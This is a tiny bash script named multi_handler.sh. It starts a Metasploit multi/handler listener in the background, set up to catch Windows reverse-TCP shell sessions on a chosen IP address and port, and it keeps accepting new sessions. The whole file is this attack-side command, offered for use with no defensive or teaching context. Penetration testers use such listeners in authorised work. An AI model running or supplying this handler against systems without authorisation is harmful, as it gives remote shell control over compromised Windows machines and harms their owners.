#/bin/bash
# multi_handler.sh - js
msfconsole -x "use multi/handler; set LPORT $PORT; set LHOST $IP_ADDRESS; set payload windows/shell_reverse_tcp; set ExitOnSession false; exploit -j"
